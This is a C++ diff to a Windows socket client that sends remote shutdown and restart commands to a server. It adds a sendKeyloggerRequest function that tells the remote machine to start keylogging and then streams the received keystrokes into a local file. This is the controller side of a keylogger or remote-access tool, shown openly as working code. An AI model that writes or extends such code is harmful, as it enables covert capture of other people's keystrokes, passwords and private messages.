@@ -1,5 +1,8 @@
 #include "client_socket.h"
 #include <iostream>
+#include <fstream>
+#include <conio.h>
+
 
 Client::Client(const std::string& serverIP, int port)
     : serverIP(serverIP), port(port), clientSocket(INVALID_SOCKET) {
@@ -46,7 +49,7 @@ bool Client::connectToServer() {
 }
 
 bool Client::sendShutdownRequest() {
-    const char* message = "SHUTDOWN";
+    const char* message = "shutdown";
     int result = send(clientSocket, message, strlen(message), 0);
     if (result == SOCKET_ERROR) {
         std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
@@ -57,12 +60,46 @@ bool Client::sendShutdownRequest() {
 }
 
 bool Client::sendRestartRequest() {
-    const char* message = "RESTART";
+    const char* message = "restart";
     int result = send(clientSocket, message, strlen(message), 0);
     if (result == SOCKET_ERROR) {
         std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
         return false;
     }
     std::cout << "Restart request sent successfully!" << std::endl;
+    return true;
+}
+
+bool  Client::sendKeyloggerRequest(){
+    const char* message = "keylogger";
+    int result = send(clientSocket, message, strlen(message), 0);
+    if (result == SOCKET_ERROR) {
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+    
+    char buffer[1024];
+    std::ofstream outFile("keylogger_output.txt", std::ios::app);  // Open file in append mode
+
+    if (!outFile) {
+        std::cerr << "Error: Unable to open file for writing.\n";
+        return false;
+    }
+    while(true){
+        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
+        if (bytesReceived > 0) {
+            // Write the received data to the file
+            std:: cout << std::string(buffer, 0, bytesReceived) << " ";
+            outFile << std::string(buffer, 0, bytesReceived) << " ";
+            outFile.flush();
+        }
+          if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
+            std::cout << "Exiting KeyLogger...\n";
+            break;
+        }
+        Sleep(10); 
+    }
+    outFile.close();
+   
     return true;
 }
